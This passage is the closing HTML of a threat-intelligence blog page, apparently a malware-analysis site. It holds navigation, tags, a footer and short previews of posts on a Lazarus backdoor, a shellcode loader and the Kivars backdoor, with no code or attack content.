title="Telegram" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <button id="copy-link" aria-label="Copy link" class="btn small" data-bs-toggle="tooltip" data-bs-placement="top" title="Copy link" data-title-succeed="Link copied successfully!" > <i class="fa-fw fas fa-link pe-none fs-6"></i> </button> </span></div></div></div></article></main><aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 mb-5 text-muted"><div class="access"><section id="access-lastmod"><h2 class="panel-heading">Recently Updated</h2><ul class="content list-unstyled ps-0 pb-1 ms-1 mt-2"><li class="text-truncate lh-lg"> <a href="/posts/Python_Backdoor_TW/">Python Backdoor Uploaded from Taiwan</a><li class="text-truncate lh-lg"> <a href="/posts/Unattributed_Downloader_Cambodia/">Unattributed Shellcode Loader Likely Targeting Cambodia</a><li class="text-truncate lh-lg"> <a href="/posts/Kivars/">China-nexus Kivars Backdoor Uploaded from Taiwan</a><li class="text-truncate lh-lg"> <a href="/posts/Lazarus-Backdoor-ITLure/">Lazarus Backdoor with IT Lure</a><li class="text-truncate lh-lg"> <a href="/posts/PUBLOAD_GrimResource/">PUBLOAD Likely Delivered to Thailand via GrimResource MSC</a></ul></section><section><h2 class="panel-heading">Trending Tags</h2><div class="d-flex flex-wrap mt-3 mb-1 me-3"> <a class="post-tag btn btn-outline-primary" href="/tags/malware/">malware</a> <a class="post-tag btn btn-outline-primary" href="/tags/cti/">cti</a> <a class="post-tag btn btn-outline-primary" href="/tags/apt/">apt</a> <a class="post-tag btn btn-outline-primary" href="/tags/chrome/">chrome</a> <a class="post-tag btn btn-outline-primary" href="/tags/re/">RE</a> <a class="post-tag btn btn-outline-primary" href="/tags/china/">china</a> <a class="post-tag btn btn-outline-primary" href="/tags/cn/">cn</a> <a class="post-tag btn btn-outline-primary" href="/tags/cti/">CTI</a> <a class="post-tag btn btn-outline-primary" href="/tags/dprk/">dprk</a> <a class="post-tag btn btn-outline-primary" href="/tags/golang/">golang</a></div></section></div></aside></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4"><aside id="related-posts" aria-labelledby="related-label"><h3 class="mb-4" id="related-label">Further Reading</h3><nav class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4"><article class="col"> <a href="/posts/Lazarus-Backdoor-ITLure/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1739059200" data-df="ll" > Feb 9, 2025 </time><h4 class="pt-0 my-2">Lazarus Backdoor with IT Lure</h4><div class="text-muted"><p>On January 27, 2025, @smica83 shared a sample on X indicating that it looked like Lazarus malware. I reviewed the sample and concluded that, indeed, it is a North Korean backdoor, likely the latest...</p></div></div></a></article><article class="col"> <a href="/posts/Unattributed_Downloader_Cambodia/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1742688000" data-df="ll" > Mar 23, 2025 </time><h4 class="pt-0 my-2">Unattributed Shellcode Loader Likely Targeting Cambodia</h4><div class="text-muted"><p>On March 20, 2025, MalwareHunterTeam shared a sample of a ZIP file containing an LNK, uploaded from Cambodia: The ZIP file is named CNP_MFA_Meeting_Documents.zip. It contains an LNK file named M...</p></div></div></a></article><article class="col"> <a href="/posts/Kivars/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1740355200" data-df="ll" > Feb 24, 2025 </time><h4 class="pt-0 my-2">China-nexus Kivars Backdoor Uploaded from Taiwan</h4><div class="text-muted"><p>On February 22, 2025, MalwareHunterTeam shared a DLL uploaded from Taiwan with hash 1286aa5c73cf2c8058c52271869a5727d71ca5bd4dd0854be970d2a25cb52bf8 The DLL was uploaded from Taiwan on February ...</p></div></div></a></article></nav></aside><nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation"> <a href="/posts/Unattributed_Downloader_Cambodia/" class="btn btn-outline-primary" aria-label="Older" ><p>Unattributed Shellcode Loader Likely Targeting Cambodia</p></a><div class="btn btn-outline-primary disabled" aria-label="Newer"><p>-</p></div></nav><footer aria-label="Site Info" class=" d-flex flex-column justify-content-center text-muted flex-lg-row justify-content-lg-between align-items-lg-center pb-lg-3 " ><p>© <time>2025</time> <a href="https://github.com/dmpdump">dmpdump</a>. <span data-bs-toggle="tooltip" data-bs-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author." >Some rights reserved.</span></p><p>Using the <a data-bs-toggle="tooltip" data-bs-placement="top" title="v7.1.0" href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener" >Chirpy</a> theme for <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>.</p></footer></div></div><div id="search-result-wrapper" class="d-flex justify-content-center d-none"><div class="col-11 content"><div id="search-hints"><section><h2 class="panel-heading">Trending Tags</h2><div class="d-flex flex-wrap mt-3 mb-1 me-3"> <a class="post-tag btn btn-outline-primary" href="/tags/malware/">malware</a> <a class="post-tag btn btn-outline-primary" href="/tags/cti/">cti</a> <a class="post-tag btn btn-outline-primary" href="/tags/apt/">apt</a> <a class="post-tag btn btn-outline-primary" href="/tags/chrome/">chrome</a> <a class="post-tag btn btn-outline-primary" href="/tags/re/">RE</a> <a class="post-tag btn btn-outline-primary" href="/tags/china/">china</a> <a class="post-tag btn btn-outline-primary" href="/tags/cn/">cn</a> <a class="post-tag btn btn-outline-primary" href="/tags/cti/">CTI</a> <a class="post-tag btn btn-outline-primary" href="/tags/dprk/">dprk</a> <a class="post-tag btn btn-outline-primary" href="/tags/golang/">golang</a></div></section></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><aside aria-label="Scroll to Top"> <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow"> <i class="fas fa-angle-up"></i> </button></aside></div><div id="mask"></div><aside id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-bs-animation="true" data-bs-autohide="false" ><div class="toast-header"> <button type="button" class="btn-close ms-auto" data-bs-dismiss="toast" aria-label="Close" ></button></div><div class="toast-body text-center pt-0"><p class="px-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></aside><script src="https://cdn.jsdelivr.net/combine/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/glightbox@3.3.0/dist/js/glightbox.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.13/dayjs.min.js,npm/dayjs@1.11.13/locale/en.js,npm/dayjs@1.11.13/plugin/relativeTime.js,npm/dayjs@1.11.13/plugin/localizedFormat.js"></script> <script src="/assets/js/dist/post.min.js"></script> <script defer src="/app.min.js"></script> <script>SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<article class="px-1 px-sm-2 px-lg-4 px-xl-0"><header><h2><a href="{url}">{title}</a></h2><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div></header><p>{snippet}</p></article>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script>
